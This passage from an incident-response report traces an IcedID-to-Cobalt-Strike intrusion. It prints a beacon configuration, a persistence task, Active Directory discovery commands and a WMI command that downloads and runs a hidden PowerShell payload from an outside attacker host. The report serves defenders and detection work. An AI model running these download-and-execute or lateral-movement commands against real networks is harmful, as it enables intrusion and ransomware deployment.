<p>After this an MZ header can be observed. From there, the data can be saved and reviewed using <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py" target="_blank" rel="noreferrer noopener">1768.py</a> from <a href="https://twitter.com/didierstevens" target="_blank" rel="noopener">Didier Stevens</a>, revealing the Cobalt Strike configuration embedded within:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18568" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-018.png" alt width="1600" height="355" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-018.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-018-300x67.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-018-1024x227.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-018-768x170.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-018-1536x341.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>The full configuration:</p>
<pre class="wp-block-preformatted">Config found: xorkey b'.' 0x00000000 0x0000573e
0x0001 payload type                     0x0001 0x0002 8 windows-beacon_https-reverse_https
0x0002 port                             0x0001 0x0002 757
0x0003 sleeptime                        0x0002 0x0004 62518
0x0004 maxgetsize                       0x0002 0x0004 1864736
0x0005 jitter                           0x0001 0x0002 37
0x0007 publickey                        0x0003 0x0100 30819f302e06092a864886f72e010101050003818d00308189028181009380b188bdba677c26ff8adc2fd5bde97d595fccaa7b389be52c2c76d5bad1537105f105e3303f03b29e6dd3066367c59146249f914e4aa18d8045ec45dc96dddd6e0edb8dead60763dede9aa61c8821c8045f7314580df527b8191fe0c831ffcb75564587be8ecf56cf938973f2cef6de420d9e1e7dc9a8cc1cc520aec3371d020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0x0008 server,get-uri                   0x0003 0x0100 'aicsoftware\rcom,/templates'
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\regsvr32\rexe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\regsvr32\rexe'
0x001f CryptoScheme                     0x0001 0x0002 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 0
0x0025 license-id                       0x0002 0x0004 305419776
0x0026 bStageCleanup                    0x0001 0x0002 1
0x0027 bCFGCaution                      0x0001 0x0002 0
0x0009 useragent                        0x0003 0x0100 'Mozilla/5\r0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601\r3\r9 (KHTML, like Gecko) Version/9\r0\r2 Safari/601\r3\r9'
0x000a post-uri                         0x0003 0x0040 '/favicon'
0x000b Malleable_C2_Instructions        0x0003 0x0100
  Transform Input: [7:Input,4,2:600,3,46]
   Print
   Remove 600 bytes from begin
   BASE64
   Unknown instruction: 0x2e
0x000c http_get_header                  0x0003 0x0200
comonst_host_header Host: aicsoftware
  Const_header Connection: close
  Build Metadata: [7:Metadata,46,3,2:wordpress_logged_in=,6:Cookie,9:mark=true]
   Unknown instruction: 0x2e
   BASE64
   Prepend wordpress_logged_in=
   Header Cookie
   Const_parameter mark=true
0x002e process-inject-transform-x86     0x0003 0x0200 '\x00\x00\x00\x10\x00\x00\x00\x15Host: aicsoftware\rcom\x00\x00\x00\n\x00\x00\x00\x11Connection: close\x00\x00\x00\n\x00\x00\x00/Content-Type: application/x-www-form-urlencoded\x00\x00\x00\x07\x00\x00\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00\x04yes=\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00\x0e__session__id=\x00\x00\x00\x06\x00\x00\x00\x06Cookie'
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 1
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x003a TCP_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0039 SMB_FRAME_HEADER                 0x0003 0x0080 '\x00\x04'
0x0037 EXIT_FUNK                        0x0001 0x0002 0
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 177872
0x002a feSectionsInfo            0x0003 0x0028 '\x00À\x02\x00r¸\x03\x00\x00À\x03\x00\x88\x85\x04\x00\x00\x90\x04\x004°\x04\x00\x00À\x04\x00^Ï\x04'
0x002b process-inject-start-rwx         0x0001 0x0002 4 PAGE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 32 PAGE_EXECUTE_READ
0x002d process-inject-min_alloc         0x0002 0x0004 6133
0x000d http_post_header                 0x0003 0x0100
  Header 
0x002f process-inject-transform-x64     0x0003 0x0100 '\x00\x00\x00\x06\x90\x90\x90\x90\x90\x90'
0x0035 process-inject-stub              0x0003 0x0010 'µJþ\x01ìjuíó^\x1aDø½9)'
0x0033 process-inject-execute           0x0003 0x0080 '\x01\x04\x03'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0000
Guessing Cobalt Strike version: 4.2 (max 0x003a)
Sanity check Cobalt Strike config: OK
</pre>
<p>After using PowerShell beacons during the first day on the beachhead host and a Domain Controller, the threat actors moved to using DLL files exclusively for the remainder of Cobalt Strike beacons deployed during the intrusion. Other notable executions included the use of batch files:</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /c c:\windows\temp\1.bat
-&gt; rundll32.exe c:\windows\temp\1.dll, DllRegisterServer
</pre>
<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
<p>During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:</p>
<ul class="wp-block-list">
<li><strong>exdudipo.dll</strong>: IcedID first stage.</li>
<li><strong>license.dat</strong>: Encoded version of the second stage which the first stage will load into memory.</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18570" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-019.png" alt width="3492" height="226" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-019.png 3492w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-019-300x19.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-019-1024x66.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-019-768x50.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-019-1536x99.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-019-2048x133.png 2048w" sizes="(max-width: 3492px) 100vw, 3492px" /></a></p>
<p>A scheduled task was created that contained instructions on executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID has used for persistence.</p>
<pre class="wp-block-preformatted">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;URI&gt;\{3774AD25-8218-8099-89BA-CE96C6E9DC4E}&lt;/URI&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;TimeTrigger id="TimeTrigger"&gt;
      &lt;Repetition&gt;
        &lt;Interval&gt;PT1H&lt;/Interval&gt;
        &lt;StopAtDurationEnd&gt;false&lt;/StopAtDurationEnd&gt;
      &lt;/Repetition&gt;
      &lt;StartBoundary&gt;2012-01-01T12:00:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;/TimeTrigger&gt;
    &lt;LogonTrigger id="LogonTrigger"&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;UserId&gt;[REDACTED USER]&lt;/UserId&gt;
    &lt;/LogonTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
      &lt;UserId&gt;[REDACTED DOMAIN]\[REDACTED USER]&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;false&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;Duration&gt;PT10M&lt;/Duration&gt;
      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;rundll32.exe&lt;/Command&gt;
      &lt;Arguments&gt;"C:\Users\[REDACTED USER]\AppData\Roaming\{02959BFD-29E0-6A95-3B77-5E55B8D01CB7}\{CA2AB541-E118-83C2-ADAD-8729FDCA00C0}\exdudipo.dll",#1 --pa="AntiquePeanut\license.dat"&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;
</pre>
<p>The scheduled task was configured to execute every hour.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18571" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-020.png" alt width="3466" height="566" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-020.png 3466w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-020-300x49.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-020-1024x167.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-020-768x125.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-020-1536x251.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-020-2048x334.png 2048w" sizes="(max-width: 3466px) 100vw, 3466px" /></a></p>
<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>
<p>Privilege escalation was completed on two systems via the named pipe <em>GetSystem </em>feature within the Cobalt Strike tool. An example is shown below via Sysmon event ID 1 &#8211; ProcessCreate Rule:</p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18572" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-021.png" alt width="1600" height="383" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-021.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-021-300x72.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-021-1024x245.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-021-768x184.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-021-1536x368.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
<p>This intrusion displayed numerous techniques used by threat actors to evade detection.</p>
<h3 class="wp-block-heading">Process Injection</h3>
<p>The adversary was seen injecting code into legitimate processes via <code>CreateRemoteThread</code> which can be detected using Sysmon event ID 8.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18573" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-022.png" alt width="634" height="418" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-022.png 634w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-022-300x198.png 300w" sizes="(max-width: 634px) 100vw, 634px" /></a></p>
<p>The table below shows examples of injected processes found via an in memory yara scan using this <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike" target="_blank" rel="noreferrer noopener">Malpedia yara rule</a>:</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Host</td>
<td>Process ID</td>
<td>ProcessName</td>
<td>CommandLine</td>
<td>Yara Rule</td>
</tr>
<tr>
<td>workstation.domain.local</td>
<td>612</td>
<td>winlogon.exe</td>
<td>winlogon.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>workstation.domain.local</td>
<td>828</td>
<td>svchost.exe</td>
<td>C:\Windows\system32\svchost.exe -k DcomLaunch -p</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>fileshare.domain.local</td>
<td>760</td>
<td>svchost.exe</td>
<td>C:\Windows\system32\svchost.exe -k DcomLaunch -p</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>fileshare.domain.local</td>
<td>4928</td>
<td>winlogon.exe</td>
<td>winlogon.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>fileshare.domain.local</td>
<td>1960</td>
<td>rundll32.exe</td>
<td>rundll32.exe c:\windows\temp\1.dll</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>beachhead.domain.local</td>
<td>712</td>
<td>lsass.exe</td>
<td>C:\Windows\system32\lsass.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>beachhead.domain.local</td>
<td>812</td>
<td>svchost.exe</td>
<td>C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>beachhead.domain.local</td>
<td>5884</td>
<td>TextInputHost.exe</td>
<td>C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe -ServerName:InputApp.AppXjd5de1g66v206tj52m9d0dtpppx4cgpn.mca</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>beachhead.domain.local</td>
<td>2036</td>
<td>sysmon64.exe</td>
<td>C:\Windows\sysmon64.exe -z syscliprpc9E7B7D3FAF371803</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>beachhead.domain.local</td>
<td>2568</td>
<td>regsvr32.exe</td>
<td>C:\Windows\syswow64\regsvr32.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>beachhead.domain.local</td>
<td>9760</td>
<td>cmd.exe</td>
<td>C:\Windows\SysWOW64\cmd.exe</td>
<td>win_cobalt_strike_auto</td>
</tr>
<tr>
<td>server.domain.local</td>
<td>432</td>
<td>rundll32.exe</td>
<td>rundll32.exe 1.dll</td>
<td>win_cobalt_strike_auto</td>
</tr>
</tbody>
</table>
</figure>
<h3 class="wp-block-heading">File Deletion</h3>
<p>Files that were dropped in temporary directories were deleted after execution as seen below with Sysmon event ID 11 and 23.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18574" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-023.png" alt width="996" height="103" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-023.png 996w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-023-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-023-768x79.png 768w" sizes="(max-width: 996px) 100vw, 996px" /></a></p>
<p>Below is the list of files seen being created and later deleted by the threat actor:</p>
<pre class="wp-block-preformatted">7.exe
adfind.bat
adfind.exe
adget.exe
ad.7z
1.bat
1.dll
7.exe
ns.bat
</pre>
<h3 class="wp-block-heading">Renamed System Utilities</h3>
<p>Adversaries typically rename common Windows system utilities to avoid triggering alerts that monitor utility usage. The table below summaries the renamed utilities observed in this intrusion.</p>
<div class="clickup-table-view" contenteditable="false">
<table class="clickup-table"><colgroup><col width="150" /><col width="434" /></colgroup>
<tbody>
<tr data-row="row-kdaw25">
<td contenteditable="true" colspan="1" rowspan="1" data-row="row-kdaw25" data-cell="cell-ctm8oo">
<div class="qlbt-cell-line" data-row="row-kdaw25" data-cell="cell-ctm8oo" data-rowspan="1" data-colspan="1" data-block-id="block-d0eea694-b2eb-48cf-9a7c-1f8992dd4d2a">Windows Utility</div>
</td>
<td contenteditable="true" colspan="1" rowspan="1" data-row="row-kdaw25" data-cell="cell-k4prsh">
<div class="qlbt-cell-line" data-row="row-kdaw25" data-cell="cell-k4prsh" data-rowspan="1" data-colspan="1" data-block-id="block-55004883-9d62-4b21-95f9-f6aa6e8fae06">Renamed Windows Utility</div>
</td>
</tr>
<tr data-row="row-fu7kxc">
<td contenteditable="true" colspan="1" rowspan="1" data-row="row-fu7kxc" data-cell="cell-jbg0sb">
<div class="qlbt-cell-line" data-row="row-fu7kxc" data-cell="cell-jbg0sb" data-rowspan="1" data-colspan="1" data-block-id="block-dfca2040-495c-480b-8b18-bf866a442cf1">rundll32.exe</div>
</td>
<td contenteditable="true" colspan="1" rowspan="1" data-row="row-fu7kxc" data-cell="cell-6969ws">
<div class="qlbt-cell-line" data-row="row-fu7kxc" data-cell="cell-6969ws" data-rowspan="1" data-colspan="1" data-block-id="block-46d638c8-373f-450b-9926-ec8681af7281">C:\Users\&lt;REDACTED&gt;\Documents\calc.exe</div>
</td>
</tr>
<tr data-row="row-7e974e">
<td contenteditable="true" colspan="1" rowspan="1" data-row="row-7e974e" data-cell="cell-qr91b2">
<div class="qlbt-cell-line" data-row="row-7e974e" data-cell="cell-qr91b2" data-rowspan="1" data-colspan="1" data-block-id="block-4d24ae1b-6011-4ba8-a73f-3d2363b1e95f">psexesvc.exe</div>
</td>
<td contenteditable="true" colspan="1" rowspan="1" data-row="row-7e974e" data-cell="cell-hewnct">
<div class="qlbt-cell-line" data-row="row-7e974e" data-cell="cell-hewnct" data-rowspan="1" data-colspan="1" data-block-id="block-f722f885-29b2-4de6-91b1-3c13988a403d">C:\Windows\mstdc.exe</div>
</td>
</tr>
</tbody>
</table>
</div>
<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<p>The threat actors were observed accessing a file server, and browsing though files related to passwords. These would later be observed opened off network, more details in the <a href="#exfiltration">exfiltration section</a> on that activity.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18577" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1.png" alt width="2718" height="509" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1.png 2718w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1-300x56.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1-1024x192.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1-768x144.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1-1536x288.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-025-1-2048x384.png 2048w" sizes="(max-width: 2718px) 100vw, 2718px" /></a></p>
<p>On the second day of the intrusion, after moving laterally to a Domain Controller, LSASS was accessed from a Cobalt Strike process. The access granted value 0x1010 was observed. As <a href="https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/" target="_blank" rel="noreferrer noopener">noted in a previous report</a>, this value matches known <a href="https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html" target="_blank" rel="noreferrer noopener">mimikatz access patterns</a>. This logged event suggests Cobalt Strike accessed LSASS to dump credentials from memory. This activity was observed again on various hosts on the fourth and sixth days of the intrusion.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18578" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-026.png" alt width="799" height="277" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-026.png 799w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-026-300x104.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-026-768x266.png 768w" sizes="(max-width: 799px) 100vw, 799px" /></a></figure>
<p>&nbsp;</p>
<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
<p>The discovery phase primarily utilized built-in Windows tools. One utility seen was <code>chcp </code>which allows you to display or set the code page number. The default <code>chcp </code>value is determined by the Windows locale. The locale can indicate the language, country, and regional standards of that host (e.g. date and time formatting). After viewing the default page code, the adversary did change the value to 65001 to reflect the UTF-8 character set. We have seen this as a technique employed by IcedID for some time as reported in depth in <a href="https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/" target="_blank" rel="noreferrer noopener">prior cases</a>.</p>
<pre class="wp-block-preformatted">arp -a
chcp &gt;&amp;2
chcp 65001
chcp 65001 &amp;&amp; c: &amp;&amp; cd c:\
dir \\&lt;REDACTED&gt;\c$
ipconfig /all
net config workstation
net group "Domain Admins" /domain
net group "Domain Computers" /domain
net group "domain admins" /dom
net group "enterprise admins" /dom
net localgroup "administrators" /dom
net view /all
net view /all /domain
net1 config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
ping &lt;HOST_IP&gt;
systeminfo
whoami
whoami /upn
</pre>
<p>Following the initial discovery commands mentioned above on day one, the threat actor scanned the network for port 1433, the default port used by Microsoft SQL server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18579" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-027.png" alt width="1062" height="608" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-027.png 1062w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-027-300x172.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-027-1024x586.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-027-768x440.png 768w" sizes="(max-width: 1062px) 100vw, 1062px" /></a></p>
<p>The discovery phase remained minimal leading into day six. The threat actors were seen dropping AdFind and adget.exe to reveal all users, groups, computers, organizational units, subnets, and trust objects within the domain.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18580" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-028.png" alt width="1522" height="486" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-028.png 1522w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-028-300x96.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-028-1024x327.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-028-768x245.png 768w" sizes="(max-width: 1522px) 100vw, 1522px" /></a></p>
<pre class="wp-block-preformatted">adfind.exe -gcb -sc trustdmp
adfind.exe -f (objectcategory=group)
adfind.exe -subnets -f (objectCategory=subnet)
adfind.exe -f (objectcategory=organizationalUnit)
adfind.exe -f objectcategory=computer
adfind.exe -f (objectcategory=person)
</pre>
<p>Adget is a newer tool that we first observed in this <a href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" target="_blank" rel="noreferrer noopener">previous report</a> but generally this tool performs similar AD discovery as AdFind.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18581" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-029.png" alt width="776" height="455" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-029.png 776w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-029-300x176.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-029-768x450.png 768w" sizes="(max-width: 776px) 100vw, 776px" /></a></p>
<p>Following the Active Directory discovery activity, additional remote discovery actions were observed using WMI to gather information about Windows OS version and licensing on the hosts.</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" /user:"USER" /password:"REDACTED" os get caption
</pre>
<p>Then another recon round occurred using NSLOOKUP to map assets to IP addresses.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18582" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-030.png" alt width="894" height="460" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-030.png 894w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-030-300x154.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-030-768x395.png 768w" sizes="(max-width: 894px) 100vw, 894px" /></a></p>
<p>This was followed by network scans for RDP:</p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18583" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-031.png" alt width="1504" height="509" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-031.png 1504w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-031-300x102.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-031-1024x347.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-031-768x260.png 768w" sizes="(max-width: 1504px) 100vw, 1504px" /></a></p>
<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
<p>During this intrusion, threat actors used a number of different techniques to move laterally across the domain. The techniques used will be detailed in the following sections.</p>
<h3 class="wp-block-heading">T1021.006 Remote Services: WinRM</h3>
<p>Some of the threat actors&#8217; lateral activity was executed using WinRM, this could be observed by matching parent-child process trees and DCE RPC traffic.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18584" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-032.png" alt width="1828" height="615" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-032.png 1828w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-032-300x101.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-032-1024x345.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-032-768x258.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-032-1536x517.png 1536w" sizes="(max-width: 1828px) 100vw, 1828px" /></a></p>
<h3 class="wp-block-heading">T1047 WMI</h3>
<p>Threat Actors ran the following command to download and execute an in memory PowerShell payload on a domain controller:</p>
<pre class="wp-block-preformatted">C:\\Windows\\System32\\wbem\\wmic.exe  /node:REDACTED process call create \""cmd.exe /c powershell.exe -nop -w hidden -c \""\""IEX ((new-object net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))\""\"""
</pre>
<p>WMI was also used also when executing remote DLL beacons:</p>
<pre class="wp-block-preformatted">C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" process call create "c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer
</pre>
<p>WMI commands were also observed during ransom deployment:</p>
<pre class="wp-block-preformatted">wmic /node:REDACTED /user:DOMAIN\USER /password:REDACTED process call create cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp
</pre>
<h3 class="wp-block-heading">T1021.002 Remote Services: SMB/Windows Admin Shares</h3>
<p>The threat actors relied on SMB to move their tools throughout the network during the intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18585" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-033.png" alt width="933" height="356" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-033.png 933w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-033-300x114.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-033-768x293.png 768w" sizes="(max-width: 933px) 100vw, 933px" /></a></p>
<p>The threat actors used PSExec to move laterally to servers during the ransom execution, the -r flag was used to rename the binary created on the remote server to <code>mstdc.exe</code>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18586" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-034.png" alt width="946" height="992" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-034.png 946w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-034-286x300.png 286w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-034-768x805.png 768w" sizes="(max-width: 946px) 100vw, 946px" /></a></p>
<p>Below are some of the PsExec forensic artifacts logged in Windows Event Logs and Sysmon:</p>
